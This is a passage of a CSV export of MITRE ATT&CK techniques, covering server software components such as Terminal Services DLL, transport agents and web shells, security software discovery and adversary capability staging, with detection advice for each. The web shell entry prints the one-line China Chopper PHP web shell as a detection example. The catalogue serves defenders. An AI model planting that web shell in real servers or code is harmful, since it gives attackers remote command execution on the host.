Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR) ",https://attack.mitre.org/techniques/T1505/001,12 December 2019,25 March 2020,enterprise-attack,1.0,Persistence,"On a MSSQL Server, consider monitoring for xp_cmdshell usage.(Citation: NetSPI Startup Stored Procedures) Consider enabling audit features that can log malicious startup activities.","Linux, Windows",Application Log: Application Log Content,True,T1505,,"Carlos Borges, @huntingneo, CIP; Kaspersky; Lucas da Silva Pereira, @vulcanunsec, CIP","Administrator, root, SYSTEM",,,,,"(Citation: Dragos Crashoverride 2018),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),"
T1505.005,attack-pattern--379809f6-2fac-42c1-bd2e-e9dee70b27f8,Server Software Component: Terminal Services DLL,"Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop Services)

[Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run as a ""generic"" process (ex: <code>svchost.exe</code>) load the service's DLL file, the location of which is stored in a Registry entry named <code>ServiceDll</code>.(Citation: Microsoft System Services Fundamentals) The <code>termsrv.dll</code> file, typically stored in `%SystemRoot%\System32\`, is the default <code>ServiceDll</code> value for Terminal Services in `HKLM\System\CurrentControlSet\services\TermService\Parameters\`.

Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.(Citation: James TermServ DLL) Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions by either patching the <code>termsrv.dll</code> file or modifying the <code>ServiceDll</code> value to point to a DLL that provides increased RDP functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",https://attack.mitre.org/techniques/T1505/005,28 March 2022,18 April 2022,enterprise-attack,1.0,Persistence,"Monitor for changes to Registry keys associated with <code>ServiceDll</code> and other subkey values under <code>HKLM\System\CurrentControlSet\services\TermService\Parameters\</code>.

Monitor unexpected changes and/or interactions with <code>termsrv.dll</code>, which is typically stored in <code>%SystemRoot%\System32\</code>.

Monitor commands as well as  processes and arguments for potential adversary actions to modify Registry values (ex: <code>reg.exe</code>) or modify/replace the legitimate <code>termsrv.dll</code>.

Monitor module loads by the Terminal Services process (ex: <code>svchost.exe -k termsvcs</code>) for unexpected DLLs (the default is <code>%SystemRoot%\System32\termsrv.dll</code>, though an adversary could also use [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005) on a malicious payload).",Windows,"Command: Command Execution, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1505,,,,,,,,",(Citation: Microsoft System Services Fundamentals)"
T1505.002,attack-pattern--35187df2-31ed-43b6-a1f5-2f1d3d58d3f1,Server Software Component: Transport Agent,"Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. 

Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary. ",https://attack.mitre.org/techniques/T1505/002,12 December 2019,18 October 2021,enterprise-attack,1.0,Persistence,Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.,"Linux, Windows","Application Log: Application Log Content, File: File Creation",True,T1505,,Christoffer Strömblad; ESET,"Administrator, root, SYSTEM",,,,,"(Citation: ESET LightNeuron May 2019),"
T1505.003,attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb,Server Software Component: Web Shell,"Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)

In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)",https://attack.mitre.org/techniques/T1505/003,13 December 2019,30 March 2023,enterprise-attack,1.3,Persistence,"Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013) 

<code>&lt;?php @eval($_POST['password']);&gt;</code>

Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as spawning cmd.exe or accessing files that are not in the Web directory.(Citation: NSA Cyber Mitigating Web Shells)

File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script.(Citation: NSA Cyber Mitigating Web Shells)

Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)","Linux, Network, Windows, macOS","Application Log: Application Log Content, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation",True,T1505,,"Arnim Rupp, Deutsche Lufthansa AG",,,Adversary access to Web server with vulnerability or account to upload and serve the Web shell file.,,,"(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Tarrask scheduled task),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Mandiant APT29 Eye Spy Email Nov 22),(Citation: Microsoft HAFNIUM March 2020),(Citation: FireEye APT39 Jan 2019),(Citation: Unit42 SUPERNOVA Dec 2020),(Citation: Guidepoint SUPERNOVA Dec 2020),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: FoxIT Wocao December 2019),(Citation: Lee 2013),(Citation: Microsoft GALLIUM December 2019),(Citation: CISA AA21-200A APT40 July 2021),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: ANSSI Sandworm January 2021),(Citation: Cybereason Soft Cell June 2019),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: FireEye Exchange Zero Days March 2021),(Citation: ESET Exchange Mar 2021),(Citation: Mandiant APT41),(Citation: CISA AA20-301A Kimsuky),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: FireEye TRITON 2019),(Citation: Secureworks BRONZE SILHOUETTE May 2023),(Citation: Volexity Exchange Marauder March 2021),(Citation: US-CERT TA18-074A),(Citation: CrowdStrike Deep Panda Web Shells),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: FireEye APT40 March 2019),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: ClearSky Pay2Kitten December 2020),(Citation: Unit42 Emissary Panda May 2019),(Citation: DFIR Phosphorus November 2021),(Citation: Volexity OceanLotus Nov 2017),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Dell TG-3390),(Citation: Unit42 OilRig Playbook 2023),(Citation: CISA Supernova Jan 2021),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: NSA and ASD Detect and Prevent Web Shells 2020),(Citation: ITSyndicate Disabling PHP functions)"
T1518.001,attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384,Software Discovery: Security Software Discovery,"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.

Adversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.(Citation: Expel IO Evil in AWS) For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the <code>DescribeSecurityGroups</code> action with various request parameters. (Citation: DescribeSecurityGroups - Amazon Elastic Compute Cloud)",https://attack.mitre.org/techniques/T1518/001,21 February 2020,21 April 2023,enterprise-attack,1.4,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

In cloud environments, additionally monitor logs for the usage of APIs that may be used to gather information about security software configurations within the environment.","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Command: Command Execution, Firewall: Firewall Enumeration, Firewall: Firewall Metadata, Process: OS API Execution, Process: Process Creation",True,T1518,,"Isif Ibrahima, Mandiant",,,,,,"(Citation: Unit 42 BadPatch Oct 2017),(Citation: Cofense Astaroth Sept 2018),(Citation: Kaspersky TajMahal April 2019),(Citation: FinFisher Citation),(Citation: Cyphort EvilBunny Dec 2014),(Citation: ESET Casbaneiro Oct 2019),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Trend Micro Tick November 2019),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Mcafee Clop Aug 2019),(Citation: Cisco Talos Intelligence Group),(Citation: Cymmetria Patchwork),(Citation: Unit 42 Rocke January 2019),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: ESET Grandoreiro April 2020),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: DustySky),(Citation: Check Point Meteor Aug 2021),(Citation: Talos Frankenstein June 2019),(Citation: ESET Dukes October 2019),(Citation: Github PowerShell Empire),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Kaspersky Adwind Feb 2016),(Citation: Korean FSI TA505 2020),(Citation: Baumgartner Naikon 2015),(Citation: Cylance Shaheen Nov 2018),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Talos Zeus Panda Nov 2017),(Citation: Security Affairs SILENTTRINITY July 2019),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Palo Alto Brute Ratel July 2022),(Citation: TrendMicro TropicTrooper 2015),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Microsoft PLATINUM April 2016),(Citation: Checkpoint IndigoZebra July 2021),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Kaspersky Flame Functionality),(Citation: Proofpoint TA2541 February 2022),(Citation: McAfee Gold Dragon),(Citation: wardle evilquest parti),(Citation: FireEye MuddyWater Mar 2018),(Citation: Cybereason Clop Dec 2020),(Citation: Talos Promethium June 2020),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Cybereason Valak May 2020),(Citation: Kaspersky Turla),(Citation: Kaspersky WIRTE November 2021),(Citation: Talos Rocke August 2018),(Citation: ESET PipeMon May 2020),(Citation: SentinelLabs Metador Sept 2022),(Citation: GDATA Zeus Panda June 2017),(Citation: Proofpoint TA505 Mar 2018),(Citation: Cybereason Molerats Dec 2020),(Citation: Radware Micropsia July 2018),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Trend Micro Skidmap),(Citation: Microsoft SIR Vol 21),(Citation: Kaspersky Flame),(Citation: Forcepoint Felismus Mar 2017),(Citation: ESET GreyEnergy Oct 2018),(Citation: F-Secure CozyDuke),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: FoxIT Wocao December 2019),(Citation: FireEye APT28),(Citation: Proofpoint Bumblebee April 2022),(Citation: Prevailion EvilNum May 2020),(Citation: ESET Gelsemium June 2021),(Citation: Zscaler Kasidet),(Citation: TechNet Netsh Firewall),(Citation: Palo Alto Comnie),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Cylance Shell Crew Feb 2017),(Citation: TechNet Netsh),(Citation: TrendMicro Netwalker May 2020),(Citation: Talos Cobalt Group July 2018),(Citation: ESET Operation Groundbait),(Citation: Kaspersky QakBot September 2021),(Citation: Palo Alto T9000 Feb 2016),(Citation: Cybereason Bazar July 2020),(Citation: KISA Operation Muzabi),(Citation: Unit42 CookieMiner Jan 2019),(Citation: trendmicro xcsset xcode project 2020),(Citation: ESET ComRAT May 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: BlackBerry Bahamut),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: BiZone Lizar May 2021),(Citation: BlackBerry Amadey 2020),(Citation: Securelist MuddyWater Oct 2018),(Citation: FireEye APT34 Dec 2017),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Morphisec ShellTea June 2019),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: Microsoft Tasklist),(Citation: Trend Micro Waterbear December 2019),(Citation: Securelist Darkhotel Aug 2015),(Citation: Symantec Bumblebee June 2022),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: ATT QakBot April 2021),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Crowdstrike Qakbot October 2020),(Citation: DFIR Ryuk's Return October 2020),(Citation: Securelist BlackOasis Oct 2017),(Citation: Kaspersky StoneDrill 2017),(Citation: Talos Micropsia June 2017),(Citation: ESET RTM Feb 2017),(Citation: jRAT Symantec Aug 2018),(Citation: Prevx Carberp March 2011),(Citation: Unit 42 WhisperGate January 2022),(Citation: Prevailion DarkWatchman 2021),(Citation: ESET InvisiMole June 2020),(Citation: FireEye SUNBURST Additional Details Dec 2020),(Citation: Unit 42 VERMIN Jan 2018),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Microsoft DUBNIUM June 2016),(Citation: GitHub Pacu),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),"
T1608.004,attack-pattern--31fe0ba2-62fd-4fd9-9293-4043d84f7fe9,Stage Capabilities: Drive-by Target,"Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).

Adversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including:

* Inserting malicious scripts into web pages or other user controllable web content such as forum posts
* Modifying script files served to websites from publicly writeable cloud storage buckets
* Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))

In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox)

Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.

Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",https://attack.mitre.org/techniques/T1608/004,17 March 2021,15 April 2023,enterprise-attack,1.3,Resource Development,"If infrastructure or patterns in the malicious web content utilized to deliver a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) have been previously identified, internet scanning may uncover when an adversary has staged web content for use in a strategic web compromise.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).",PRE,Internet Scan: Response Content,True,T1608,,,,,,,,"(Citation: Mandiant FIN7 Apr 2022),(Citation: Gallagher 2015),(Citation: Gigamon Berserk Bear October 2021),(Citation: Bitdefender LuminousMoth July 2021),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Volexity Ocean Lotus November 2020),(Citation: Unit 42 ProjectM March 2016),(Citation: Talos Transparent Tribe May 2021),"
T1608.003,attack-pattern--c071d8c1-3b3a-4f22-9407-ca4e96921069,Stage Capabilities: Install Digital Certificate,"Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.(Citation: DigiCert Install SSL Cert)

Adversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. 

Adversaries can obtain digital certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) or create self-signed certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1587/003)). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).",https://attack.mitre.org/techniques/T1608/003,17 March 2021,16 October 2021,enterprise-attack,1.1,Resource Development,"Consider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017)

Detection efforts may be focused on related behaviors, such as [Web Protocols](https://attack.mitre.org/techniques/T1071/001) or [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).",PRE,Internet Scan: Response Content,True,T1608,,,,,,,,","
T1608.005,attack-pattern--84ae8255-b4f4-4237-b5c5-e717405a9701,Stage Capabilities: Link Target,"Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)) or a phish to gain initial access to a system (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)), an adversary must set up the resources for a link target for the spearphishing link. 

Typically, the resources for a link target will be an HTML page that may include some client-side script such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003).(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019) Adversaries may also [Upload Malware](https://attack.mitre.org/techniques/T1608/001) and have the link target point to malware for download/execution by the user.

Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Link shortening services can also be employed. Adversaries may also use free or paid accounts on Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked.(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)(Citation: Intezer App Service Phishing) Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.(Citation: Talos IPFS 2022)",https://attack.mitre.org/techniques/T1608/005,17 March 2021,11 April 2023,enterprise-attack,1.3,Resource Development,"If infrastructure or patterns in malicious web content have been previously identified, internet scanning may uncover when an adversary has staged web content to make it accessible for targeting.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such as during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003), [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002), or [Malicious Link](https://attack.mitre.org/techniques/T1204/001).",PRE,Internet Scan: Response Content,True,T1608,,Goldstein Menachem,,,,,,"(Citation: Secureworks COBALT DICKENS September 2019),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Proofpoint TA407 September 2019),(Citation: Malwarebytes Silent Librarian October 2020),"
T1608.006,attack-pattern--e5d550f3-2202-4634-85f2-4a200a1d49b3,Stage Capabilities: SEO Poisoning,"Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site’s ranking/score/reputation calculated by their web crawlers and algorithms.(Citation: Atlas SEO)(Citation: MalwareBytes SEO)

To help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).(Citation: ZScaler SEO)(Citation: Atlas SEO)

Adversaries may also purchase or plant incoming links to staged capabilities in order to boost the site’s calculated relevance and reputation.(Citation: MalwareBytes SEO)(Citation: DFIR Report Gootloader)

SEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.(Citation: ZScaler SEO)(Citation: Sophos Gootloader)",https://attack.mitre.org/techniques/T1608/006,30 September 2022,13 March 2023,enterprise-attack,1.0,Resource Development,,PRE,Internet Scan: Response Content,True,T1608,,"Goldstein Menachem; Hiroki Nagahama, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India; Vijay Lalwani; Will Jolliffe; Will Thomas, Equinix Threat Analysis Center (ETAC)",,,,,,","
T1608.001,attack-pattern--3ee16395-03f0-4690-a32e-69ce9ada0f9e,Stage Capabilities: Upload Malware,"Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.

Malware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.(Citation: Volexity Ocean Lotus November 2020)(Citation: Talos IPFS 2022)

Adversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204). [Masquerading](https://attack.mitre.org/techniques/T1036) may increase the chance of users mistakenly executing these files.",https://attack.mitre.org/techniques/T1608/001,17 March 2021,11 April 2023,enterprise-attack,1.2,Resource Development,"If infrastructure or patterns in malware have been previously identified, internet scanning may uncover when an adversary has staged malware to make it accessible for targeting.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle, such as [User Execution](https://attack.mitre.org/techniques/T1204) or [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).",PRE,Internet Scan: Response Content,True,T1608,,"Goldstein Menachem; Kobi Haimovich, CardinalOps",,,,,,"(Citation: Microsoft Actinium February 2022),(Citation: Trend Micro DRBControl February 2020),(Citation: ESET Lazarus Jun 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Talos Kimsuky Nov 2021),(Citation: Proofpoint TA2541 February 2022),(Citation: ClearSky Lazarus Aug 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Kaspersky LuminousMoth July 2021),(Citation: McAfee Lazarus Nov 2020),(Citation: Cisco Operation Layover September 2021),(Citation: Microsoft Unidentified Dec 2018),(Citation: TrendMicro EarthLusca 2022),(Citation: ClearSky Siamesekitten August 2021),(Citation: McAfee Lazarus Jul 2020),(Citation: Lacework TeamTNT May 2021),(Citation: McAfee Sharpshooter December 2018),(Citation: Google EXOTIC LILY March 2022),(Citation: Mandiant FIN7 Apr 2022),(Citation: Korean FSI TA505 2020),(Citation: ESET Operation Spalax Jan 2021),(Citation: FireEye APT29 Nov 2018),(Citation: Volexity Ocean Lotus November 2020),(Citation: McAfee Night Dragon),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Unit 42 Gamaredon February 2022),"
T1608.002,attack-pattern--506f6f49-7045-4156-9007-7474cb44ad6d,Stage Capabilities: Upload Tool,"Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.

Tools may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).(Citation: Dell TG-3390) Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Intezer App Service Phishing)

Adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.",https://attack.mitre.org/techniques/T1608/002,17 March 2021,20 October 2022,enterprise-attack,1.2,Resource Development,"If infrastructure or patterns in tooling have been previously identified, internet scanning may uncover when an adversary has staged tools to make them accessible for targeting.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle, such as [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).",PRE,Internet Scan: Response Content,True,T1608,,,,,,,,"(Citation: Mandiant UNC3890 Aug 2022),(Citation: ESET Lazarus Jun 2020),(Citation: Dell TG-3390),"
T1558.004,attack-pattern--3986e7fd-a8e9-4ecb-bfc6-55920855912b,Steal or Forge Kerberos Tickets: AS-REP Roasting,"Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) 

